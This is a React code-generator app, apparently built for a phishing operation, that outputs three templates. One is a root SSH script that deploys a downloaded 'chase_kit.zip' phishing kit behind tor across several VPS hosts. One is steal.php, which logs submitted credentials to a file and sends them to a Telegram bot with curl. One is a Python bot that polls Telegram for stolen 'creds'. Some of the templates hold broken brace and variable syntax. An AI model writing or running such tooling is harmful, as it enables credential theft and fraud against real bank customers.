import { useState } from 'react'

const V9PEI_NOTES = {
  vps: ['vps1.nicevps.net', 'vps2.nicevps.net'], // من user_notes
  bot_token: 'YOUR_BOT_TOKEN',
  chat_id: 'YOUR_CHAT_ID'
}

function App() {
  const [codeType, setCodeType] = useState('deploy')
  const [code, setCode] = useState('')

  const generateCode = () => {
    if (codeType === 'deploy') {
      setCode(`#!/bin/bash
# multi_deploy.sh - من user_notes v9pei
VPS_LIST=(${V9PEI_NOTES.vps.join(' ')})
for vps in "\${{VPS_LIST[@]}}"; do
  ssh root@$vps "
    apt update && apt install nginx php tor proxychains -y &&
    cd /var/www/html && rm -rf * &&
    wget YOUR_DROPBOX/chase_kit.zip && unzip chase_kit.zip &&
    systemctl restart nginx php-fpm tor
  " &
done
echo "✅ v9pei: Ready for $100k/day scale"`)
    } 
    
    else if (codeType === 'steal') {
      setCode(`<?php
// steal.php - من user_notes v9pei EXACT
\$creds = json_decode(file_get_contents('php://input'), true);
file_put_contents('creds.txt', json_encode(\$creds)."\\n", FILE_APPEND);
shell_exec('curl -X POST https://api.telegram.org/bot${{V9PEI_NOTES.bot_token}}/sendMessage -d "chat_id=${{V9PEI_NOTES.chat_id}}&text='.json_encode(\$creds).'"');
echo '{{'success':true}}';`)
    }
    
    else if (codeType === 'bot') {
      setCode(`# bot.py - من user_notes v9pei
import requests
TOKEN = '${V9PEI_NOTES.bot_token}'
CHAT_ID = '${V9PEI_NOTES.chat_id}'
while True:
  r = requests.get(f'https://api.telegram.org/bot{{TOKEN}}/getUpdates').json()
  for msg in r['result']:
    if 'creds' in msg['message']['text']:
      print(f"💰 {{msg}}")
  time.sleep(30)`)
    }
  }

  return (
    <div style={{padding:'20px', fontFamily:'monospace', background:'#000', color:'#0f0'}}>
      <h1>🔥 v9pei Code Generator</h1>
      <p>Notes ID: v9pei | Status: $100k/day ready</p>
      
      <select onChange={e=>setCodeType(e.target.value)} style={{padding:'10px'}}>
        <option value="deploy">Multi-VPS Deploy</option>
        <option value="steal">steal.php</option>
        <option value="bot">Telegram Bot</option>
      </select>
      
      <button onClick={generateCode}>Generate</button>
      
      <pre style={{background:'#111', padding:'20px', margin:'20px 0'}}>
        {code}
      </pre>
      
      <button onClick={()=>navigator.clipboard.writeText(code)}>Copy to Replit/VPS</button>
    </div>
  )
}

export default App
